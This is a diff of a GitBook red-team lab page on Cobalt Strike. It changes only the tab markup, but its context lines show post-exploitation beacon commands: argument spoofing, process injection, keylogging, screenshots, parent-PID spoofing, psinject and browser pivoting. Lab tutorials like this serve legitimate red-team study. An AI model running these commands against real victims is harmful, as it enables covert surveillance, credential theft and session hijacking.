@@ -12,15 +12,15 @@ This lab is for exploring the advanced penetration testing / post-exploitation t
 
 ### Team Server
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@kali" %}
+{% tabs %}
+{% tab title="attacker@kali" %}
 ```csharp
 # the syntax is ./teamserver <serverIP> <password> <~killdate> <~profile>
 # ~ optional for now
 root@/opt/cobaltstrike# ./teamserver 10.0.0.5 password
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-01-06-22-47-10.png)
 
@@ -30,13 +30,13 @@ Note that in real life red team engagements, you would put the team servers behi
 
 ### Cobalt Strike Client
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@kali" %}
+{% tabs %}
+{% tab title="attacker@kali" %}
 ```csharp
 root@/opt/cobaltstrike# ./cobaltstrike
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Enter the following:
 
@@ -84,14 +84,14 @@ Argue command allows the attacker to spoof commandline arguments of the process 
 
 The below spoofs calc command line parameters:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@cs" %}
+{% tabs %}
+{% tab title="attacker@cs" %}
 ```csharp
 beacon> argue calc /spoofed
 beacon> run calc
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-01-07-19-18-23.png)
 
@@ -109,16 +109,16 @@ Argument spoofing is done via manipulating memory structures in Process Environm
 
 Inject is very similar to metasploit's `migrate` function and allows an attacker to duplicate their beacon into another process on the victim system:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@cs" %}
+{% tabs %}
+{% tab title="attacker@cs" %}
 ```csharp
 beacon> help inject
 Use: inject [pid] <x86|x64> [listener]
 
 inject 776 x64 httplistener
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Note how after injecting the beacon to PID 776, another session is spawned:
 
@@ -126,25 +126,25 @@ Note how after injecting the beacon to PID 776, another session is spawned:
 
 ### Keylogger
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@cs" %}
+{% tabs %}
+{% tab title="attacker@cs" %}
 ```csharp
 beacon> keylogger 1736 x64
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-01-07-20-31-30.png)
 
 ### Screenshot
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@cs" %}
+{% tabs %}
+{% tab title="attacker@cs" %}
 ```csharp
 beacon> screenshot 1736 x64
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-01-07-20-33-51.png)
 
@@ -152,13 +152,13 @@ beacon> screenshot 1736 x64
 
 Runu allows us launching a new process from a specified parent process:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@cs" %}
+{% tabs %}
+{% tab title="attacker@cs" %}
 ```csharp
 runu 2316 calc
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-01-07-20-39-20.png)
 
@@ -166,13 +166,13 @@ runu 2316 calc
 
 This function allows an attacker executing powershell scripts from under any process on the victim system. Note that PID 2872 is the calc.exe process seen in the above screenshot related to `runu`:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@cs" %}
+{% tabs %}
+{% tab title="attacker@cs" %}
 ```csharp
 beacon> psinject 2872 x64 get-childitem c:\
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-01-07-20-44-30.png)
 
@@ -184,13 +184,13 @@ Highlighted in green are new handles that are opened in the target process when 
 
 Spawn a session with powershell payload from a given parent PID:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@cs" %}
+{% tabs %}
+{% tab title="attacker@cs" %}
 ```csharp
 beacon> spawnu 3848 httplistener
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-01-07-20-57-30.png)
 
@@ -210,13 +210,13 @@ The way this attack works is best explained with an example:
 
 Browser pivotting in cobalt strike:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@cs" %}
+{% tabs %}
+{% tab title="attacker@cs" %}
 ```csharp
 beacon> browserpivot 244 x86
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Note how the iexplore.exe opened up port 6605 for listening as mentioned earlier:
 
